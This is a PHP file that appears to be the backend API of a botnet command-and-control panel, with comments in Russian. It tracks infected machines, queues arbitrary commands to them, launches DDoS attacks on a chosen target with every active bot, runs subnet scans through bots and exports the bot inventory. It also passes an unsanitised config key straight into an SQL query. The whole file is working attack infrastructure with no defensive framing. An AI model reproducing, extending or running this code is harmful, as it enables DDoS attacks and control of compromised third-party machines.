<?php
header('Content-Type: application/json');
session_start();

// Конфигурация
$config = [
    'db_path' => '../c2_server/c2.db',
    'require_auth' => true,
    'rate_limit' => 100, // запросов в минуту
];

// Проверка авторизации
if($config['require_auth'] && !isset($_SESSION['auth'])) {
    http_response_code(401);
    echo json_encode(['error' => 'Unauthorized']);
    exit;
}

// Подключение к БД
try {
    $db = new SQLite3($config['db_path']);
    $db->busyTimeout(5000);
} catch(Exception $e) {
    http_response_code(500);
    echo json_encode(['error' => 'Database connection failed']);
    exit;
}

// Получение действия
$action = $_GET['action'] ?? $_POST['action'] ?? '';
$method = $_SERVER['REQUEST_METHOD'];

// Обработка действий
switch($action) {
    case 'stats':
        handleStats();
        break;
    case 'bots':
        handleBots();
        break;
    case 'bot':
        handleBot();
        break;
    case 'command':
        handleCommand();
        break;
    case 'attack':
        handleAttack();
        break;
    case 'scan':
        handleScan();
        break;
    case 'logs':
        handleLogs();
        break;
    case 'export':
        handleExport();
        break;
    case 'config':
        handleConfig();
        break;
    case 'ping':
        handlePing();
        break;
    default:
        http_response_code(400);
        echo json_encode(['error' => 'Invalid action']);
}

$db->close();

// ============ ФУНКЦИИ ОБРАБОТЧИКИ ============

function handleStats() {
    global $db;
    
    $stats = [];
    
    // Общая статистика
    $stats['total_bots'] = $db->querySingle("SELECT COUNT(*) FROM bots");
    $stats['active_bots'] = $db->querySingle("SELECT COUNT(*) FROM bots WHERE is_active = 1");
    $stats['total_infected'] = $db->querySingle("SELECT SUM(infected) FROM bots") ?: 0;
    $stats['avg_uptime'] = round($db->querySingle("SELECT AVG(uptime) FROM bots WHERE is_active = 1") / 3600, 1);
    
    // Статистика по архитектурам
    $archs = $db->query("SELECT arch, COUNT(*) as count FROM bots WHERE arch IS NOT NULL GROUP BY arch");
    $arch_stats = [];
    while($row = $archs->fetchArray(SQLITE3_ASSOC)) {
        $arch_stats[$row['arch']] = $row['count'];
    }
    $stats['arch_distribution'] = $arch_stats;
    
    // Активные атаки
    $stats['active_attacks'] = $db->querySingle("SELECT COUNT(*) FROM attacks WHERE status = 'running'");
    
    // Последние боты
    $recent = $db->query("SELECT ip, arch, os, last_seen FROM bots ORDER BY last_seen DESC LIMIT 5");
    $recent_bots = [];
    while($row = $recent->fetchArray(SQLITE3_ASSOC)) {
        $row['last_seen'] = date('Y-m-d H:i', $row['last_seen']);
        $recent_bots[] = $row;
    }
    $stats['recent_bots'] = $recent_bots;
    
    echo json_encode(['success' => true, 'data' => $stats]);
}

function handleBots() {
    global $db;
    
    $filter = $_GET['filter'] ?? 'all';
    $limit = intval($_GET['limit'] ?? 50);
    $page = intval($_GET['page'] ?? 1);
    $offset = ($page - 1) * $limit;
    
    // Построение запроса
    $query = "SELECT * FROM bots WHERE 1=1";
    $params = [];
    
    if($filter == 'active') {
        $query .= " AND is_active = 1";
    } elseif($filter == 'inactive') {
        $query .= " AND is_active = 0";
    }
    
    if(isset($_GET['arch']) && $_GET['arch'] != 'all') {
        $query .= " AND arch = :arch";
        $params[':arch'] = $_GET['arch'];
    }
    
    if(isset($_GET['os']) && $_GET['os'] != 'all') {
        $query .= " AND os LIKE :os";
        $params[':os'] = '%' . $_GET['os'] . '%';
    }
    
    $query .= " ORDER BY last_seen DESC LIMIT :limit OFFSET :offset";
    $params[':limit'] = $limit;
    $params[':offset'] = $offset;
    
    // Подготовка запроса
    $stmt = $db->prepare($query);
    foreach($params as $key => $value) {
        $stmt->bindValue($key, $value);
    }
    
    $result = $stmt->execute();
    $bots = [];
    
    while($row = $result->fetchArray(SQLITE3_ASSOC)) {
        $row['last_seen'] = date('Y-m-d H:i', $row['last_seen']);
        $row['uptime_hours'] = floor($row['uptime'] / 3600);
        $row['status'] = $row['is_active'] ? 'active' : 'inactive';
        unset($row['is_active']);
        $bots[] = $row;
    }
    
    // Общее количество для пагинации
    $count_query = str_replace('ORDER BY last_seen DESC LIMIT :limit OFFSET :offset', '', $query);
    $count_query = preg_replace('/SELECT \*/', 'SELECT COUNT(*)', $count_query);
    
    $count_stmt = $db->prepare($count_query);
    foreach($params as $key => $value) {
        if($key != ':limit' && $key != ':offset') {
            $count_stmt->bindValue($key, $value);
        }
    }
    
    $total = $count_stmt->execute()->fetchArray()[0];
    
    echo json_encode([
        'success' => true,
        'data' => $bots,
        'pagination' => [
            'page' => $page,
            'limit' => $limit,
            'total' => $total,
            'pages' => ceil($total / $limit)
        ]
    ]);
}

function handleBot() {
    global $db;
    
    $bot_ip = $_GET['ip'] ?? $_POST['ip'] ?? '';
    if(empty($bot_ip)) {
        echo json_encode(['error' => 'Bot IP required']);
        return;
    }
    
    if($_SERVER['REQUEST_METHOD'] == 'GET') {
        // Получение информации о боте
        $stmt = $db->prepare("SELECT * FROM bots WHERE ip = :ip");
        $stmt->bindValue(':ip', $bot_ip);
        $result = $stmt->execute();
        
        if($row = $result->fetchArray(SQLITE3_ASSOC)) {
            $row['last_seen'] = date('Y-m-d H:i', $row['last_seen']);
            $row['uptime_hours'] = floor($row['uptime'] / 3600);
            echo json_encode(['success' => true, 'data' => $row]);
        } else {
            echo json_encode(['error' => 'Bot not found']);
        }
    } elseif($_SERVER['REQUEST_METHOD'] == 'DELETE') {
        // Удаление бота
        $stmt = $db->prepare("DELETE FROM bots WHERE ip = :ip");
        $stmt->bindValue(':ip', $bot_ip);
        
        if($stmt->execute()) {
            echo json_encode(['success' => true, 'message' => 'Bot deleted']);
        } else {
            echo json_encode(['error' => 'Delete failed']);
        }
    } elseif($_SERVER['REQUEST_METHOD'] == 'POST') {
        // Обновление бота
        $command = $_POST['command'] ?? '';
        if(empty($command)) {
            echo json_encode(['error' => 'Command required']);
            return;
        }
        
        $stmt = $db->prepare("INSERT INTO commands (bot_ip, command, status, created_at) VALUES (:ip, :cmd, 'pending', :time)");
        $stmt->bindValue(':ip', $bot_ip);
        $stmt->bindValue(':cmd', $command);
        $stmt->bindValue(':time', time());
        
        if($stmt->execute()) {
            echo json_encode(['success' => true, 'message' => 'Command queued']);
        } else {
            echo json_encode(['error' => 'Failed to queue command']);
        }
    }
}

function handleCommand() {
    global $db;
    
    if($_SERVER['REQUEST_METHOD'] != 'POST') {
        echo json_encode(['error' => 'Method not allowed']);
        return;
    }
    
    $data = json_decode(file_get_contents('php://input'), true);
    
    if(!isset($data['bots']) || !isset($data['command'])) {
        echo json_encode(['error' => 'Missing parameters']);
        return;
    }
    
    $bots = $data['bots'];
    $command = $data['command'];
    $time = time();
    $success = 0;
    
    foreach($bots as $bot_ip) {
        $stmt = $db->prepare("INSERT INTO commands (bot_ip, command, status, created_at) VALUES (:ip, :cmd, 'pending', :time)");
        $stmt->bindValue(':ip', $bot_ip);
        $stmt->bindValue(':cmd', $command);
        $stmt->bindValue(':time', $time);
        
        if($stmt->execute()) {
            $success++;
        }
    }
    
    echo json_encode([
        'success' => true,
        'sent' => $success,
        'total' => count($bots),
        'message' => "Command sent to $success bots"
    ]);
}

function handleAttack() {
    global $db;
    
    $target = $_GET['target'] ?? $_POST['target'] ?? '';
    $method = $_GET['method'] ?? $_POST['method'] ?? 'http';
    $duration = intval($_GET['duration'] ?? $_POST['duration'] ?? 300);
    
    if(empty($target)) {
        echo json_encode(['error' => 'Target required']);
        return;
    }
    
    // Получаем активных ботов
    $active_bots = $db->querySingle("SELECT COUNT(*) FROM bots WHERE is_active = 1");
    
    if($active_bots == 0) {
        echo json_encode(['error' => 'No active bots available']);
        return;
    }
    
    // Создаем запись об атаке
    $stmt = $db->prepare("
        INSERT INTO attacks (target, method, duration, bots_count, status, started_at) 
        VALUES (:target, :method, :duration, :count, 'running', :time)
    ");
    
    $stmt->bindValue(':target', $target);
    $stmt->bindValue(':method', $method);
    $stmt->bindValue(':duration', $duration);
    $stmt->bindValue(':count', $active_bots);
    $stmt->bindValue(':time', time());
    
    if($stmt->execute()) {
        $attack_id = $db->lastInsertRowID();
        
        // Отправляем команду всем активным ботам
        $attack_cmd = "DDOS $method $target $duration";
        $time = time();
        
        $bots = $db->query("SELECT ip FROM bots WHERE is_active = 1");
        $sent = 0;
        
        while($bot = $bots->fetchArray(SQLITE3_ASSOC)) {
            $cmd_stmt = $db->prepare("INSERT INTO commands (bot_ip, command, status, created_at) VALUES (:ip, :cmd, 'pending', :time)");
            $cmd_stmt->bindValue(':ip', $bot['ip']);
            $cmd_stmt->bindValue(':cmd', $attack_cmd);
            $cmd_stmt->bindValue(':time', $time);
            
            if($cmd_stmt->execute()) {
                $sent++;
            }
        }
        
        echo json_encode([
            'success' => true,
            'attack_id' => $attack_id,
            'bots' => $sent,
            'duration' => $duration,
            'message' => "Attack started with $sent bots"
        ]);
    } else {
        echo json_encode(['error' => 'Failed to start attack']);
    }
}

function handleScan() {
    global $db;
    
    $subnet = $_GET['subnet'] ?? $_POST['subnet'] ?? '192.168.1.0/24';
    
    // Получаем 10% активных ботов для сканирования
    $total_bots = $db->querySingle("SELECT COUNT(*) FROM bots WHERE is_active = 1");
    $scan_bots = max(1, floor($total_bots * 0.1));
    
    // Создаем запись о сканировании
    $stmt = $db->prepare("
        INSERT INTO scans (subnet, scanner_ip, status, started_at) 
        VALUES (:subnet, 'multiple', 'running', :time)
    ");
    
    $stmt->bindValue(':subnet', $subnet);
    $stmt->bindValue(':time', time());
    
    if($stmt->execute()) {
        $scan_id = $db->lastInsertRowID();
        
        // Отправляем команду выбранным ботам
        $scan_cmd = "SCAN $subnet";
        $time = time();
        $sent = 0;
        
        $bots = $db->query("SELECT ip FROM bots WHERE is_active = 1 LIMIT $scan_bots");
        
        while($bot = $bots->fetchArray(SQLITE3_ASSOC)) {
            $cmd_stmt = $db->prepare("INSERT INTO commands (bot_ip, command, status, created_at) VALUES (:ip, :cmd, 'pending', :time)");
            $cmd_stmt->bindValue(':ip', $bot['ip']);
            $cmd_stmt->bindValue(':cmd', $scan_cmd);
            $cmd_stmt->bindValue(':time', $time);
            
            if($cmd_stmt->execute()) {
                $sent++;
            }
        }
        
        echo json_encode([
            'success' => true,
            'scan_id' => $scan_id,
            'scanners' => $sent,
            'subnet' => $subnet,
            'message' => "Scan started with $sent bots"
        ]);
    } else {
        echo json_encode(['error' => 'Failed to start scan']);
    }
}

function handleLogs() {
    global $db;
    
    $limit = intval($_GET['limit'] ?? 100);
    $level = $_GET['level'] ?? '';
    $source = $_GET['source'] ?? '';
    
    $query = "SELECT * FROM logs WHERE 1=1";
    $params = [];
    
    if(!empty($level)) {
        $query .= " AND level = :level";
        $params[':level'] = $level;
    }
    
    if(!empty($source)) {
        $query .= " AND source = :source";
        $params[':source'] = $source;
    }
    
    $query .= " ORDER BY created_at DESC LIMIT :limit";
    $params[':limit'] = $limit;
    
    $stmt = $db->prepare($query);
    foreach($params as $key => $value) {
        $stmt->bindValue($key, $value);
    }
    
    $result = $stmt->execute();
    $logs = [];
    
    while($row = $result->fetchArray(SQLITE3_ASSOC)) {
        $row['created_at'] = date('Y-m-d H:i:s', strtotime($row['created_at']));
        $logs[] = $row;
    }
    
    echo json_encode(['success' => true, 'data' => $logs]);
}

function handleExport() {
    global $db;
    
    $format = $_GET['format'] ?? 'json';
    $type = $_GET['type'] ?? 'bots';
    
    if($format == 'csv') {
        header('Content-Type: text/csv');
        header('Content-Disposition: attachment; filename="avkill_' . $type . '_' . date('Y-m-d') . '.csv"');
        
        $output = fopen('php://output', 'w');
        
        if($type == 'bots') {
            fputcsv($output, ['IP', 'Architecture', 'OS', 'Uptime', 'Infected', 'Last Seen', 'Status']);
            
            $result = $db->query("SELECT ip, arch, os, uptime, infected, last_seen, is_active FROM bots");
            while($row = $result->fetchArray(SQLITE3_ASSOC)) {
                $row['last_seen'] = date('Y-m-d H:i', $row['last_seen']);
                $row['status'] = $row['is_active'] ? 'Active' : 'Inactive';
                unset($row['is_active']);
                fputcsv($output, $row);
            }
        }
        
        fclose($output);
    } else {
        // JSON export
        if($type == 'bots') {
            $result = $db->query("SELECT * FROM bots");
            $data = [];
            while($row = $result->fetchArray(SQLITE3_ASSOC)) {
                $data[] = $row;
            }
            echo json_encode(['success' => true, 'data' => $data]);
        }
    }
}

function handleConfig() {
    global $db;
    
    if($_SERVER['REQUEST_METHOD'] == 'GET') {
        $key = $_GET['key'] ?? '';
        
        if($key) {
            $value = $db->querySingle("SELECT value FROM configs WHERE key = '$key'");
            echo json_encode(['success' => true, 'key' => $key, 'value' => $value]);
        } else {
            $result = $db->query("SELECT key, value FROM configs");
            $configs = [];
            while($row = $result->fetchArray(SQLITE3_ASSOC)) {
                $configs[$row['key']] = $row['value'];
            }
            echo json_encode(['success' => true, 'data' => $configs]);
        }
    } elseif($_SERVER['REQUEST_METHOD'] == 'POST') {
        $data = json_decode(file_get_contents('php://input'), true);
        
        if(isset($data['key']) && isset($data['value'])) {
            $stmt = $db->prepare("INSERT OR REPLACE INTO configs (key, value, updated_at) VALUES (:key, :value, :time)");
            $stmt->bindValue(':key', $data['key']);
            $stmt->bindValue(':value', $data['value']);
            $stmt->bindValue(':time', time());
            
            if($stmt->execute()) {
                echo json_encode(['success' => true, 'message' => 'Config updated']);
            } else {
                echo json_encode(['error' => 'Failed to update config']);
            }
        }
    }
}

function handlePing() {
    $ip = $_GET['ip'] ?? '';
    
    if(empty($ip)) {
        echo json_encode(['error' => 'IP required']);
        return;
    }
    
    // Простой пинг через socket
    $socket = @fsockopen($ip, 80, $errno, $errstr, 2);
    
    if($socket) {
        fclose($socket);
        echo json_encode(['success' => true, 'online' => true, 'ping' => 'OK']);
    } else {
        echo json_encode(['success' => true, 'online' => false, 'ping' => 'Timeout']);
    }
}
?>